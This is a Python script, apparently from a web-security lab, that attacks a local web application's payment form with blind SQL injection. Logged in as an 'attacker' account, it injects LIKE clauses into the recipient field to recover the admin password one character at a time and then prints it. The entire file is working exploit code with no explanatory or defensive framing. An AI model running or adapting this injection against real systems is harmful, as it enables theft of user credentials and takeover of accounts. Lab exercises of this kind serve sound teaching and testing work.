from requests import codes, Session

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))

    chars = [chr(i) for i in range(97, 123)]
    password = ""

    while True:
        for c in chars:
            if (submit_pay_form(sess, "{}' AND users.password LIKE '{}{}%".format(username, password, c), 0)):
                password += c
                break
            if (submit_pay_form(sess, "{}' AND users.password='{}".format(username, password), 0)):
                print(password)
                return password

def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
